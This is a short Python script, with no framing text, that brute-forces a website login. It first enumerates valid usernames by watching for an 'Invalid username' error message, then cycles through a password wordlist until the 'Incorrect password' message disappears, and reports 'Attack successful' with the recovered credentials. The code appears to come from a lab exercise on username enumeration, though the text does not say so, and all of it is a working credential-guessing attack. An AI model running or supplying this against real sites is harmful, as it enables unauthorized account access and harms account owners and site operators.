import requests
import sys

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} domain")
    sys.exit(1)

URL = sys.argv[1]

path="login"
url = URL+path

response = requests.get(url)
sess_cookie = response.cookies["session"]

f1=open("usernames.txt","r")
unames = list(f1)
f2=open("passwords.txt","r")
passwds = list(f2)

for uname in unames:
	data = {'username':uname.strip(),'password':'test'}
	response2 = requests.post(url=url,data=data,headers={"Cookie": "session="+sess_cookie})
	print(f"Trying [username : {uname.strip()}]")
	if 'Invalid username' not in response2.text:
		usrname = uname
		print(f"\nCorrect username : {usrname}")
		break
for pswd in passwds:
	data = {'username':usrname.strip(),'password':pswd.strip()}
	response2 = requests.post(url=url,data=data,headers={"Cookie": "session="+sess_cookie})
	print(f"Trying [username : {usrname.strip()} | password : {pswd.strip()}]")
	if 'Incorrect password' not in response2.text:
		print("Attack successful")
		print(f"Correct Credentials => [username : {usrname.strip()} | password : {pswd.strip()}]")
		break
